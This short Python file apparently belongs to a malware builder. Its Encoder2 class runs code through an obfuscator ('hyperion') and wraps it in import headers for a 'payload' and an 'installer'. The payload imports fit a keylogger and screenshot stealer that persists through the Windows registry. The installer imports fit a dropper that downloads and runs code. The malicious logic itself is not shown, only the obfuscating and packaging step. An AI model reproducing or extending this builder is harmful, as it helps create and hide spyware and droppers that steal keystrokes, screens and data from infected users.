from src.hyperion import *

class Encoder2:
    def __init__(self,code,code_type):
        self.code = code
        self.code_type = code_type

    def Encoding(self): 
        encoder = Work(code=self.code)
        script = encoder.main()

        if self.code_type.lower() == "payload":
            script1 = '''
import os
import requests
import time
import threading
import datetime
from PIL import ImageGrab
import queue
from pynput import keyboard
import concurrent.futures
import sys
import psutil
import json
import winreg as reg

{}
'''.format(script)
            return script1
        
        if self.code_type.lower() == "installer": 
            script2 = '''
import requests
import subprocess
import os
from urllib.parse import urlparse
from ctypes import *
import platform 
import psutil
import win32pdh
import base64

{}
'''.format(script)
            return script2